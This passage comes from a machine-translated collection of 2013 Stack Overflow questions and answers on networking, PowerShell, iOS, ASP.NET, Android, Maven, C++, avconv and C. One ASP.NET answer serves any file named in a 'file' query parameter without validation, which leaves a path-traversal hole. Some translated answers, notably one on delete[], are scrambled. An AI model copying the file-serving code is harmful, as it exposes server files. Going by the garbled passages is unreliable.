也可以计算和存储你可以自己剪一些字符串。update `time_test`set Difference = concat(TIMEDIFF(stop_time,start_time), MICROSECOND(TIMEDIFF(stop_time,start_time) )) [也可以计算并存储回来，您可以自己剪切一些字符串。](https://i.stack.imgur.com/hxGVg.jpg)

您还可以通过以下命令进行排名： SET @r:=0;
UPDATE `time_test` SET 排名= (@r:= (@r+1)) ORDER BY `difference`ASC; [您还通过此命令进行排名：](https://i.stack.imgur.com/X0mub.jpg)

# networking - 网络数据包中什么样的字段应该转换为网络字节序

> ID：15526598
> 
> 赞同：5
> 
> 时间：2013-03-20T14:38:12.537
> 
> 标签：networking, tcp, network-programming

我知道主机和网络上的字节序可能不同，但为什么字节顺序很重要？

我认为有两个原因：

1 让路由器检查 ip 标头（如地址），路由器只识别大端顺序（网络字节顺序） 2 让接收主机识别数据包的字节顺序。由于接收主机不知道发送主机的字节顺序，如果不将字节顺序转换为网络字节顺序，它就不知道数据包的字节顺序。

我对吗？

那么对于以下字段，应该转换为字节顺序，为什么？

```
1 TCP/UDP Header options, like MSS, timestamps
2 TCP/UDP header checksum
3 TCP sequence number
4 UDP/TCP data fields 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T01:42:19.920

作为比单个字节长的二进制数据（尤其不是 ASCII）发送/存储的每个字段都需要具有明确定义的字节顺序。否则，正如您所指出的，接收者不知道如何解释发送者发送的内容。

您的具体问题的答案是 #1、#2 和 #3 需要按网络字节顺序排列。至于 UDP/TCP 有效负载 (#4) 中的字段，这取决于您。建议使用网络字节顺序（大端），以便与几乎所有其他协议保持一致，但如果您正在定义协议，那么您可以根据需要选择小端。有些有。

# arrays - 将 Powershell 结果转换为数组

> ID：15526599
> 
> 赞同：0
> 
> 时间：2013-03-20T14:38:14.653
> 
> 标签：arrays, powershell, datatable

我正在使用 Microsoft Technet 的[Write-datatable](http://gallery.technet.microsoft.com/scriptcenter/2fdeaf8d-b164-411c-9483-99413d6053ae#content)。

但是我遇到了一个问题，我需要输入的数据不是数组格式，我相信它是一个对象，例如

我的数据看起来像这样

```
FirstName : john  
SecondName : smith  
Number : 1234 
```

我相信我需要它看起来像这样

```
FirstName   SecondName   Number  
---------   ----------   ------  
john         smith        1234 
```

任何帮助将不胜感激

谢谢，彼得

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T21:15:12.077

所以你有一个 powershell 对象，我们称它为 person 对象，它具有“FirstName”、“SecondName”和“Number”的成员属性。所以当你去的时候：

```
$person.FirstName
$person.SecondName
$person.Number 
```

输出应该是

```
John
Smith
1234 
```

你不能做这样的事情来使人对象成为字符串对象数组吗

```
$array = @()
$person | get-member -MemberType Property | % {$array += $person.($_.Name)} 
```

这将使您的数组以奇怪的顺序排列。所以我想你需要对订单进行硬编码。

```
$array = @()
$order = 'FirstName','SecondName','Number'
$order | % {$array += $person.$_} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T04:01:21.353

查看[Write-DataTable](http://gallery.technet.microsoft.com/scriptcenter/2fdeaf8d-b164-411c-9483-99413d6053ae#content)函数，该`$data`参数用作[SqlBulkCopy](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlbulkcopy.aspx)`WriteToServer()`类中对象方法的 uniq 参数。根据 Microsoft 文档，应该是一个 DataRow 数组、一个 DataTable 或一个 IDataReader。`$data`

![在此处输入图像描述](../Images/212919285bb8108c4be7b8455469eaaa.png)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T16:56:33.360

我发现创建了一个新的 .NET 数据表，然后将数据传递给它，谢谢大家的指点

```
 $Data_BOX_ComputerSystem2 = New-Object System.Data.DataTable

    $Data_BOX_ComputerSystem2.Columns.Add("Date")  | Out-Null
    $Data_BOX_ComputerSystem2.Columns.Add("Name")  | Out-Null
    $Data_BOX_ComputerSystem2.Columns.Add("Model")  | Out-Null
    $Data_BOX_ComputerSystem2.Columns.Add("Manufacturer")  | Out-Null
    $Data_BOX_ComputerSystem2.Columns.Add("Description")  | Out-Null
    $Data_BOX_ComputerSystem2.Columns.Add("DNSHostName")  | Out-Null
    $Data_BOX_ComputerSystem2.Columns.Add("Domain")  | Out-Null
    $Data_BOX_ComputerSystem2.Columns.Add("DomainRole", [int])  | Out-Null
    $Data_BOX_ComputerSystem2.Columns.Add("PartOfDomain")  | Out-Null
    $Data_BOX_ComputerSystem2.Columns.Add("NumberOfProcessors", [int])  | Out-Null
    $Data_BOX_ComputerSystem2.Columns.Add("SystemType")  | Out-Null
    $Data_BOX_ComputerSystem2.Columns.Add("TotalPhysicalMemory")  | Out-Null

$Data_BOX_ComputerSystem | ForEach-Object {
    $row = $Data_BOX_ComputerSystem2.NewRow()
    $row.Item('Date') = get-date -format G
    $row.Item('Name') = $_.Name.ToString()
    $row.Item('Model') = $_.Model.ToString()
    $row.Item('Manufacturer') = $_.Manufacturer.ToString()
    $row.Item('Description') = $_.Description.ToString()
    $row.Item('DNSHostName') = $_.DNSHostName.ToString()
    $row.Item('Domain') = $_.Domain.ToString()
    $row.Item('DomainRole') = $_.DomainRole.ToString()
    $row.Item('PartOfDomain') = $_.PartOfDomain.ToString()
    $row.Item('NumberOfProcessors') = $_.NumberOfProcessors.ToString()
    $row.Item('SystemType') = $_.SystemType.ToString()
    $row.Item('TotalPhysicalMemory') = $_.TotalPhysicalMemory.ToString()
    $Data_BOX_ComputerSystem2.Rows.Add($row)}

    WriteDataTable server database table $Data_BOX_ComputerSystem2 
```

# ios - 有没有办法让 UIButton 用 UILabel 中的文本包装？

> ID：15526605
> 
> 赞同：1
> 
> 时间：2013-03-20T14:38:32.070
> 
> 标签：ios, objective-c, layout, uibutton, uilabel

基本上我希望 UIButton 出现在 UILabel 的末尾。UILabel 是本地化的，因此定位可能会有所不同。有没有办法让我的布局恰到好处？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-03-20T14:51:20.067

```
button.frame = CGRectMake(label.frame.origin.x + label.frame.size.width - buttonWidth, label.frame.origin.y, buttonHeight, buttonWidth); 
```

where`buttonWidth`和`buttonHeight`只是我用来描述你应该放在那里的任意变量

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-20T15:01:54.110

我假设您想在同一视图上添加标签和按钮。你的意思是你的文本是本地化的，直到运行时才知道文本的大小。实际上，这是您要求的其他内容。因为你需要设置标签的大小取决于文本的大小。您可以使用以下方法计算文本的大小

```
- (CGSize)sizeWithFont:(UIFont *)font 
```

或者您可以在设置文本后调整标签大小

```
- (void)sizeToFit 
```

完成标签尺寸后

您可以设置按钮的框架，例如

```
button.frame = CGRectMake(label.frame.origin.x + label.frame.size.with, yPosition, buttonWidth, buttonHeight); 
```

请注意，您需要在设置标签的框架后设置按钮的框架。如果您更改框架标签，则需要更改按钮的框架。或之前的 ios 6.0，您可以使用`NSLayoutConstraint`更多信息[https://developer.apple.com/library/ios/#documentation/AppKit/Reference/NSLayoutConstraint_Class/NSLayoutConstraint/NSLayoutConstraint.html](https://developer.apple.com/library/ios/#documentation/AppKit/Reference/NSLayoutConstraint_Class/NSLayoutConstraint/NSLayoutConstraint.html)

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2013-03-20T14:43:14.317

根据标签的宽度设置按钮的X值，这会将按钮设置在标签的右侧。现在它测试了。

```
button.frame = CGRectMake(self.mylabel.frame.origin.x+self.mylabel.frame.size.width, self.mylabel.frame.origin.y, 50.00, 20.00); 
```

![在此处输入图像描述](../Images/afb07ede4ea347de9cd4638858a45630.png)

# java - 在我的项目（src）中读取xml文件

> ID：15526607
> 
> 赞同：0
> 
> 时间：2013-03-20T14:38:41.710
> 
> 标签：java, xml, gwt, logging

我有两个关于 GWT 的问题：

我正在开发一个应用程序，它必须读取项目内部的一个 xml 文件，但我把这个：

```
Document doc = docBuilder.parse(new File(stringPath)); 
```

是字符串路径：

```
URL path = nameClase.class.getProtectionDomain().getCodeSource().getLocation();
String stringPath = path.toString();
stringPath = stringPath.substring(5);
int num = stringPath.indexOf("classes");
stringPath = stringPath.substring(0, num + 8);
stringPath += "namePackage/nameFile.xml"; 
```

有了这个，我得到了它的 xml 文件的路径。如果我在本地机器上这样做是可以的，但是当我只做一个 .war 文件时，我选择 src 文件夹，然后使用 ant 文件创建我的 .war 文件，然后当我在 tomcat 中部署我的 gwt 项目时，我没有得到没关系，因为捕获的路线是：

```
machine/war/WEB-INF/classes/package/nameFile.xml 
```

但是当我做war文件时，我没有获得war/WEB-INF文件夹，因为我在src文件夹中做了一个.jar。

如何获取xml文件的路径？此 xml 文件位于 src 文件夹中。

我的另一个问题是如何创建日志文件？有人有一个我可以看到的例子吗？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:43:50.957

尝试

```
 InputStream is = getClass().getResourceAsStream("/namePackage/nameFile.xml");
    Document doc = docBuilder.parse(is); 
```

# asp.net - 通过按钮下载文件

> ID：15526608
> 
> 赞同：1
> 
> 时间：2013-03-20T14:38:42.833
> 
> 标签：asp.net, vb.net

在我的网页上，我有一个按钮。当我点击它时，我希望它向浏览器发送一个文档。

这是点击事件中的代码：

```
Private Sub btMNCgetTemplate_Click(sender As Object, e As EventArgs) Handles btMNCgetTemplate.Click
    Dim MNCid As Integer = Me.cbMNCrequestType.SelectedValue
    Dim mncRT As New MinorNetworkChangeTypeOfRequests
    Dim MNCrq As New MNCTypeOfRequestItem

    MNCrq = mncRT.Find(MNCid)
    If MNCrq IsNot Nothing Then
        If MNCrq.Form.ToLower.EndsWith(".doc") Or 
           MNCrq.Form.ToLower.EndsWith(".docx") Then
            Response.ContentType = "Application/msword"
        Else
            Response.ContentType = "Application/x-msexcel"
        End If

        Response.AppendHeader("Content-Disposition", String.Format("attachment; filename={0}", MNCrq.Form))
        Response.TransmitFile(Server.MapPath(String.Format("~/forms/{0}", MNCrq.Form)))
        Response.End()
    End If
End Sub 
```

MNCrq 对象的 Form 属性具有文件的名称。

一开始这很好，用户有一个保存文件窗口。但现在它不再工作了。当我在 Chrome 中运行该网站时，没有任何反应。当我在 IE9 中运行网站时，我在一些不是我的文件中收到以下错误消息：

```
Unhandled exception at line 940, column 13 in http://localhost:29226/ScriptResource.axd?
d=DbqlGCg_y1TWNdNykQXSWTqf7VMHZvfOOc8W9SvKy5VJEvrKhkNOK5JNcaIC4d76X42JcWSxljh5epK1GqlRC4_NnfoLlKD1PfZ2-dNg98DHOKlBmICo8PKGlg73PqEQJR5AdM_sf6udu_6Vkp3cg9MicDI1&t=7c776dc1

0x800a139e - Microsoft JScript runtime error: Sys.WebForms.PageRequestManagerParserErrorException: The message received from the server could not be parsed. 
```

我在这里做错了什么？

rg，埃里克

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T15:05:13.487

您可以使用`WriteFile`. 请确保`Server.MapPath(String.Format("~/forms/{0}", MNCrq.Form))`返回存在的有效文件。

```
Response.AddHeader("Content-Disposition", 
   String.Format("attachment; filename={0}", MNCrq.Form))
Response.WriteFile(Server.MapPath(String.Format("~/forms/{0}", MNCrq.Form)))
Response.End(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:48:01.710

我几乎不是专业人士，但我会尝试建议我曾经自己做过的事情:)

为什么不将文件添加到您网站的目录中，并使用，作为一个随机的例子，

```
Server.Transfer("C:\Users\Eric\Desktop\Website\Attachments\WordFile.docx") 
```

或将按钮更改为超链接并将其链接到文件？这是一种让事情变得更简单的方法，它需要更少的代码并且更不容易出错。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T15:16:54.477

使用了另一种解决方案。

我创建了一个新的 ASPX 页面并在加载事件中放入以下代码：

```
 Dim bestand As String = Page.Request("file")

Response.ClearContent()
Response.ClearHeaders()
Dim fi As New FileInfo(Server.MapPath(".\forms\") + bestand)

Response.ContentType = "application/x-unknown" ' arbitrary 
Response.AddHeader("Content-Disposition", "attachment; filename=" + bestand)
Response.AddHeader("Content-Length", fi.Length.ToString())

Response.BinaryWrite(File.ReadAllBytes(fi.FullName))

Response.End() 
```

从我的按钮事件中，我通过以下方式调用它：

```
 Response.Redirect(String.Format("givefile.aspx?file={0}", MNCrq.Form), False) 
```

现在我得到了文件。

rg. 埃里克

# android - 用户密码失败时Android拍照

> ID：15526613
> 
> 赞同：0
> 
> 时间：2013-03-20T14:38:58.883
> 
> 标签：android, broadcastreceiver, android-camera, runtimeexception, device-admin

我有一个 DeviceAdminReceiver，当用户输入密码失败时，我想用前置摄像头拍照 - 但出现错误...

编码：

```
@Override
    public void onPasswordFailed(Context context, Intent intent) {
        try {
            takePictureNoPreview(context);
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }

public void takePictureNoPreview(Context context) throws IOException {
        // open back facing camera by default
        Camera myCamera = Camera.open();

        if (myCamera != null) {
            try {
                // set camera parameters if you want to
                // ...

                // here, the unused surface view and holder
                SurfaceView dummy = new SurfaceView(context);
                myCamera.setPreviewDisplay(dummy.getHolder());
                myCamera.startPreview();
                myCamera.takePicture(null, null, getJpegCallback()); //ERROR HERE, LINE 85

            } finally {
                // myCamera.close();

            }

        } else {
            // booo, failed!
        }
    }

    private PictureCallback getJpegCallback() {
        PictureCallback jpeg = new PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera camera) {
                FileOutputStream fos;
                try {
                    fos = new FileOutputStream("test.jpeg");
                    fos.write(data);
                    fos.close();
                } catch (IOException e) {
                    // do something about it
                }
            }
        };
        return jpeg;

    } 
```

错误日志：

```
03-20 08:01:35.427: E/AndroidRuntime(26930): FATAL EXCEPTION: main
03-20 08:01:35.427: E/AndroidRuntime(26930): java.lang.RuntimeException: Unable to start receiver packagename.receivername: java.lang.RuntimeException: takePicture failed
03-20 08:01:35.427: E/AndroidRuntime(26930):    at android.app.ActivityThread.handleReceiver(ActivityThread.java:2383)
03-20 08:01:35.427: E/AndroidRuntime(26930):    at android.app.ActivityThread.access$1500(ActivityThread.java:141)
03-20 08:01:35.427: E/AndroidRuntime(26930):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1310)
03-20 08:01:35.427: E/AndroidRuntime(26930):    at android.os.Handler.dispatchMessage(Handler.java:99)
03-20 08:01:35.427: E/AndroidRuntime(26930):    at android.os.Looper.loop(Looper.java:137)
03-20 08:01:35.427: E/AndroidRuntime(26930):    at android.app.ActivityThread.main(ActivityThread.java:5041)
03-20 08:01:35.427: E/AndroidRuntime(26930):    at java.lang.reflect.Method.invokeNative(Native Method)
03-20 08:01:35.427: E/AndroidRuntime(26930):    at java.lang.reflect.Method.invoke(Method.java:511)
03-20 08:01:35.427: E/AndroidRuntime(26930):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)
03-20 08:01:35.427: E/AndroidRuntime(26930):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:560)
03-20 08:01:35.427: E/AndroidRuntime(26930):    at dalvik.system.NativeStart.main(Native Method)
03-20 08:01:35.427: E/AndroidRuntime(26930): Caused by: java.lang.RuntimeException: takePicture failed
03-20 08:01:35.427: E/AndroidRuntime(26930):    at android.hardware.Camera.native_takePicture(Native Method)
03-20 08:01:35.427: E/AndroidRuntime(26930):    at android.hardware.Camera.takePicture(Camera.java:1095)
03-20 08:01:35.427: E/AndroidRuntime(26930):    at android.hardware.Camera.takePicture(Camera.java:1040)
03-20 08:01:35.427: E/AndroidRuntime(26930):    at packagename.receivername.takePictureNoPreview(DeviceAdmin.java:85)
03-20 08:01:35.427: E/AndroidRuntime(26930):    at packagename.receivername.onPasswordFailed(DeviceAdmin.java:49)
03-20 08:01:35.427: E/AndroidRuntime(26930):    at android.app.admin.DeviceAdminReceiver.onReceive(DeviceAdminReceiver.java:305)
03-20 08:01:35.427: E/AndroidRuntime(26930):    at android.app.ActivityThread.handleReceiver(ActivityThread.java:2376)
03-20 08:01:35.427: E/AndroidRuntime(26930):    ... 10 more 
```

可能是什么问题呢？提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-16T11:41:42.833

`takePicture`失败，因为必须有一个高于 android 4.0（至少 1x1 像素）的表面视图

# ruby - 在 Ruby 脚本的结尾处为空的 `begin end`

> ID：15526616
> 
> 赞同：0
> 
> 时间：2013-03-20T14:39:06.710
> 
> 标签：ruby

我刚刚找到了一个以以下行结尾的 Ruby 脚本：

```
exit

begin

end 
```

对我来说，这看起来毫无意义；但是编写脚本的开发人员通常不会做愚蠢的事情。

这真的有什么成就吗？对 Ruby 中的一个已知错误进行某种修复，也许？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:54:39.260

据我所知，没有。它没有意义，没有功能，也没有功能。exit 之后什么都没有被解析（不完全正确 [1]，但在这种情况下它是），并且一个空的 begin end 也不是真的有用。

我认为这是开发/清理/重构过程中的一个简单疏忽。即使是优秀的开发人员当然也会犯错误。

因此，确定他的意图的最简单方法当然是询问作者！

[1] [http://www.ruby-doc.org/core-1.9.3/Kernel.html#method-i-exit](http://www.ruby-doc.org/core-1.9.3/Kernel.html#method-i-exit)

# java - 如何使用 Maven Bundle Plugin 防止某些属性被添加到 bundle 的清单中？

> ID：15526623
> 
> 赞同：2
> 
> 时间：2013-03-20T14:39:20.820
> 
> 标签：java, maven, osgi, maven-bundle-plugin

我想从我的发布 jar 中删除某些标题（例如“内置”）。

我已经读过将标题设置为空内容应该可以解决问题，但这对我不起作用。例如，我正在使用：

```
<plugin>
    <groupId>org.apache.felix</groupId>
    <artifactId>maven-bundle-plugin</artifactId>
    <version>2.3.7</version>
    <extensions>true</extensions>
    <configuration>
        <instructions>
            <Built-By>a</Built-By>
            <Build-Jdk></Build-Jdk>
            <Created-By></Created-By>
            <Somethng-else>Hello</Somethng-else>
        </instructions>
    </configuration>
</plugin> 
```

在`Something-else`添加时，所有其他标题（例如`Built-By`）仍然存在。有什么见解吗？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T15:34:29.220

```
<_removeheaders>Build-*</_removeheaders> 
```

很高兴听到您发现插件很烦人（似乎没有寻找[手册](http://bnd.bndtools.org)）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:55:12.890

我使用 maven-jar-plugin，这是我的 pom：

```
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-jar-plugin</artifactId>
    <version>2.2</version>
    <executions>
        <execution>
            <goals>
                <goal>test-jar</goal>
            </goals>
        </execution>
    </executions>
    <configuration>
        <archive>
            <manifest>
               <addClasspath>true</addClasspath>
               <mainClass>...MyClass</mainClass>
               <classpathPrefix>libs/</classpathPrefix>
               <addDefaultImplementationEntries>true</addDefaultImplementationEntries>
            </manifest>
            <manifestEntries>
                <Built-By>a</Built-By>
                <Build-Jdk></Build-Jdk>
                <Created-By></Created-By>
                <Somethng-else>Hello</Somethng-else>
            </manifestEntries>
        </archive>
    </configuration>
</plugin> 
```

# symfony - 如何将 ORM 实体添加到模型中

> ID：15526624
> 
> 赞同：3
> 
> 时间：2013-03-20T14:39:20.927
> 
> 标签：symfony, doctrine-orm

我的应用程序越来越复杂，我发现从 ORM 实体直接到视图是不够的。

我想添加模型。他们将从我的 ORM 实体中获取数据，但也会添加一些功能。例如，我的`User`ORM 实体有一个`endDate`属性和一个`trial`属性。我想添加一种`isExpired`方法来确保

1.  `endDate`比今天晚，并且
2.  `trial`是假的

（这是一个简单的例子。我的要求要复杂得多，这就是为什么我想将逻辑移到视图之外。）

这样做的正确方法是什么？说我`UserModel`上课。除了我的其他属性/方法之外，该`User`对象是否会成为该类的属性？我能否保留 Doctrine 在单个查询中获取所有对象的能力？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:52:17.770

为什么不`isExpired()`直接将方法添加到实体中？没有人强迫您只保留实体中的数据库内容。

# regex - 更改此正则表达式以包含带连字符的数字

> ID：15526628
> 
> 赞同：0
> 
> 时间：2013-03-20T14:39:36.843
> 
> 标签：regex

我有一个正则表达式来排除所有特殊字符 - /^\s*[a-zA-Z0-9,\s]+\s*$/ 如何更改此正则表达式以排除除连字符以外的特殊字符，以便用户可以输入带破折号的数字

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:41:17.140

只需在您的集合中添加破折号：

```
/^\s*[a-zA-Z0-9,\s-]+\s*$/ 
```

您可以对其进行一些优化：

```
/^\s*[A-Za-z\d,\s-]+\s*$/ 
```

\d - 表示所有*数字*

@MikeM，你是对的。完毕！正如@MikeM 所注意到的，将 Az 改回 A-Za-z。

# asp.net - 如何从单独的 .NET 应用程序获取当前上下文或用户身份？

> ID：15526630
> 
> 赞同：5
> 
> 时间：2013-03-20T14:39:44.870
> 
> 标签：asp.net, asp.net-mvc, forms-authentication, membership-provider

# 背景

我正在开发从旧版 ASP.NET 表单应用程序到 MVC 4 应用程序的迭代迁移。

这种迁移是分阶段进行的，一次一个部分，因此有必要同时运行旧 MVC 应用程序和新 MVC 应用程序。对于某些部分，用户被引导到新应用程序，而对于尚未迁移的部分，用户被引导回（或保留在）旧应用程序。

在服务器上，应用程序的结构如下：

```
LEGACY (.NET 2.0 forms app)--
                            |--Api (new MVC 4 WebAPI)
                            |--V2 (new MVC 4) 
```

`foo`因此，对 legacy 页面的调用是`/foo.aspx`，而在 V2 上是`/V2/foo`.

一切都在 C# 中，但请注意，**旧版应用程序在 .NET 2.0 上运行，而 V2 应用程序在 .NET 4.5 上运行**。我不确定这是否重要，但认为这很重要。

# 问题

我无法在应用程序之间成功共享用户/身份验证状态。显然，如果用户登录旧版应用程序，我需要在调用 V2 页面时在 V2 应用程序上获取他们的身份验证 cookie（或采取类似操作），以便用户不会再次收到登录提示。

# 我试过的

我在两个 web.config 文件中设置了相同的`authentication`和元素：`machinekey`

```
 <authentication mode="Forms">
      <forms cookieless="UseCookies" defaultUrl="~/someUrl" loginUrl="/" path="/" protection="All" timeout="240"  enableCrossAppRedirects ="true" domain="someDomain.com" requireSSL="false"  />
  </authentication>
  <machineKey validationKey="DE78CF63226\. . .788658D142AB881" decryptionKey="0B97E8BA4C4EB4B4C524\. . .54E4622E14168D2D5C84461FA2" validation="SHA1" decryption="AES" /> 
```

我在 V2 应用程序的 Global.asax 中尝试过这段代码：

```
protected void Application_AuthenticateRequest(Object sender, EventArgs e)
{
    string cookieName = FormsAuthentication.FormsCookieName;
    HttpCookie authCookie = Context.Request.Cookies[cookieName];

    if (authCookie == null)
    {
        return;
    }
    FormsAuthenticationTicket authTicket = null;
    try
    {
        authTicket = FormsAuthentication.Decrypt(authCookie.Value);
    }
    catch
    {
        return;
    }
    if (authTicket == null)
    {
        return;
    }
    string[] roles = authTicket.UserData.Split(new char[] { '|' });
    var id = new FormsIdentity(authTicket);
    var principal = new GenericPrincipal(id, roles);

    //Thread.CurrentPrincipal = principal;

    Context.User = principal;
} 
```

**但我不知道它是否有效**，因为旧版应用程序与我的 V2 应用程序不在同一个解决方案中，因此当我调试 V2 应用程序时，我无法通过旧版应用程序登录并模拟在 legacy 和 V2 之间切换的实际用户体验。

我也刚刚尝试将其添加到我`HomeController`的列表中，希望相同的机器密钥对我有一些魔力：

```
 ViewBag.UserName = User.Identity.Name; 
```

显然，然后我绑定`ViewBag.UserName`到视图中的一个 html 元素，但这似乎也不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T16:35:35.070

表单身份验证的签名和加密算法在 .NET 2.0 和 4.0 之间切换；所以在你的 4.0 配置中尝试

```
<appSettings>
    <add key="aspnet:UseLegacyFormsAuthenticationTicketCompatibility" value="true" />
    <add key="aspnet:UseLegacyEncryption" value="true" />
    <add key="aspnet:UseLegacyMachineKeyEncryption" value="true" />
</appSettings> 
```

请注意，现在您有一个持久的身份验证方法来访问您的 webapi 端点，您很容易受到 CSRF 的攻击，您需要防范它。Mike Wasson在 asp.net 上有一个[演练](http://www.asp.net/web-api/overview/security/preventing-cross-site-request-forgery-%28csrf%29-attacks)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-21T01:10:27.787

在父应用上设置 machineKey compatibleMode="Framework20SP2"。

.net 4.5 无法从 4.0（或更低版本）读取身份验证令牌

[http://technet.microsoft.com/en-us/subscriptions/index/system.web.configuration.machinekeycompatibilitymode](http://technet.microsoft.com/en-us/subscriptions/index/system.web.configuration.machinekeycompatibilitymode)

[http://blogs.msdn.com/b/webdev/archive/2012/10/23/cryptographic-improvements-in-asp-net-4-5-pt-2.aspx](http://blogs.msdn.com/b/webdev/archive/2012/10/23/cryptographic-improvements-in-asp-net-4-5-pt-2.aspx)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-20T16:17:44.400

您为这两个应用程序使用的域/子域是什么？Cookie 不会在域甚至子域之间共享（除非 cookie 设置在通配符域上，即 *.mydomain.com）。

例如，如果 V1 应用程序位于 v1.somedomain.com 并且 cookie 设置在 v1.somedomain.com 上。然后在 v2.somedomain.com 上的 V2 将*看*不到它。但是，如果您在 *.somedomain.com 上设置 cookie，那么*两个*应用程序都会看到 cookie。

但是，如果 V1 在 v1domain.com 上而 V2 在 v2domain.com 上，那么您就不走运了。无法共享 cookie。

# c++ - 'delete [] _v;' 是什么意思？意思是？

> ID：15526637
> 
> 赞同：0
> 
> 时间：2013-03-20T14:39:53.760
> 
> 标签：c++

```
template<>
class CalcHashClass<const char*> {
public:
    CalcHashClass(const char* v) {
        _v = new char[strlen(v) + 1];
        strcpy(_v,v);
    }

    ~CalcHashClass() {
        delete [] _v;
    }

    int hashCode() {
        printf("This is 'template <> class CalcHashClass<const char*>'.\n");
        int len = strlen(_v);
        int code = 0;
        for (int i = 0; i < len; ++i)
            code += (int)_v[i];
        return code;
    }

private:
    char* _v;
}; 
```

对于上面的代码，我不确定是什么`delete [] _v;`意思？在我的理解中，_v 是一个指针。并删除它应该使用`delet _v`，对吗？是什么`[]`意思？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T14:41:17.690

`delete x`只会删除变量 x 而`[ ]`向内存管理器指示分配了一个数组。`delete[] x`将删除分配的数组。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-20T14:41:07.663

查看`_v`指向的对象是如何分配的：

```
_v = new char[strlen(v) + 1]; 
```

它使用`new char[...]`语法，这意味着它动态分配`char`. 要销毁动态分配的数组，您需要使用`delete[]`.

这是必要的原因是因为编译器无法从单独`_v`的类型中判断它指向一个数组。`_v`由于`_v`只是 a `char*`，因此您没有理由不能将其指向单个动态 allocate `char`。所以`delete[]`告诉编译器它需要确切地找出这里分配了多少空间，然后释放所有空间。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-20T14:40:48.590

`delete[]`称为“数组删除运算符”。它删除使用分配的数组`new[]`。

需要注意的是，不允许将数组`delete`与非数组一起使用`new`，反之亦然。

有关更多信息，请参阅[为什么我们甚至需要“delete[]”运算符？](https://stackoverflow.com/questions/252515/why-do-we-even-need-the-delete-operator)

作为旁注，您的班级违反了[三原则](http://en.wikipedia.org/wiki/Rule_of_three_%28C++_programming%29)。您应该提供（或禁用）复制构造函数和复制赋值运算符。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-20T14:40:55.687

当您使用分配的数组时，如果您仅使用分配的内存，则`new []`需要使用您将有未定义的行为。在发布的代码中，您在此处的构造函数中分配使用：`delete []``delete``new []``new []`

```
_v = new char[strlen(v) + 1]; 
```

因此`delete []`稍后在析构函数中调用。

# ffmpeg - 如何使用 avconv 将 MP4 文件转换为 MPEG？

> ID：15526640
> 
> 赞同：3
> 
> 时间：2013-03-20T14:39:59.290
> 
> 标签：ffmpeg, libav

我有一些 MP4 格式的视频文件，我想将它们转换为 MPEG 格式的文件。

我尝试转换：

```
avconv -i 1.mp4 -fmp4 -target mpeg /mpeg/1.mpeg 
```

但我收到以下错误

```
1.mp4: Invalid data found when processing input 
```

我的命令中缺少什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-20T17:48:30.777

我鼓励您在使用它之前阅读[该工具的文档](http://libav.org/avconv.html)。出了什么问题：

*   `-fmp4`不是一个有效的选项。也许你的意思是`-f mp4`，有一个空格，但是：
    *   这是多余的，因为您的输入文件有后缀`.mp4`，`avconv`应该很好地解析它
    *   该选项放置不正确，因为您`-f` *需要*将`-i`.
*   `-target`只取值`vcd`, `svcd`, `dvd`, `dv`, `dv50`, 和 not `mpeg`。如果要对 MPEG 视频进行编码，则需要选择带有`-c:v`. `-target`仅当您想针对上述任何输出格式时才应使用，在这种情况下`avconv`，请自行选择正确的编解码器。

话虽如此，我们不知道您想要什么 MPEG 视频。有 MPEG-1、MPEG-2、MPEG-4 Visual 和 MPEG-4 AVC，每种都有不同的编码器。请参阅`avconv -codecs`列表。

尝试这样的事情：

```
avconv -i 1.mp4 -c:v mpeg2video -q:v 2 -c:a libmp3lame output.mpg 
```

我在这里明确指定了 MPEG-2 视频，具有可变质量编码。品质因数`-q`可设置为 1 到 31，其中 1 为最佳品质。2-5 是一个很好的尝试范围。MP3 音频是可选的，但它总是有助于明确指定您想要的编解码器，而不是`avconv`选择默认值。

此外，在询问有关 Libav 或 FFmpeg 的问题时，请始终包括完整的、未删减的控制台输出，而不仅仅是您认为相关的错误消息。否则，故障排除要复杂得多。

# c - C中字符串数组的动态分配

> ID：15526642
> 
> 赞同：1
> 
> 时间：2013-03-20T14:40:01.253
> 
> 标签：c, arrays, string, pointers, malloc

对于家庭作业，我需要定义一个将内存分配给字符串数组（位于结构中）的函数。

给定每个字符串的长度： MAX_WORD_LEN+1 (=10+1) 我必须为`len`字符串数分配内存，`len`在输入中收到。

带有字符串数组定义的结构（给定）：

```
struct dict{
    int len;
    char (*dict0)[MAX_WORD_LEN+1];
    char (*dict1)[MAX_WORD_LEN+1];
}; 
```

